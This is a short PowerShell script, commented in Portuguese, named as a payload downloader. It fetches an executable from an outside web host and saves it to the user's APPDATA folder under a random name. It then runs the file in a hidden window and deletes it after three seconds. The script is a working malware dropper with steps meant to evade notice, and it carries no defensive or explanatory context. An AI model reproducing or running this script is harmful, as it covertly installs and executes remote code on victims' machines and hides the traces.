# exec.ps1 - Download e execução do payload
$url = "https://testedessamerda.squareweb.app/programa.exe"
$path = "$env:APPDATA\$([System.IO.Path]::GetRandomFileName()).exe"

# Download
(New-Object Net.WebClient).DownloadFile($url, $path)

# Executar
Start-Process -FilePath $path -WindowStyle Hidden

# Aguardar 3 segundos e deletar
Start-Sleep 3
Remove-Item -Path $path -Force -ErrorAction SilentlyContinue

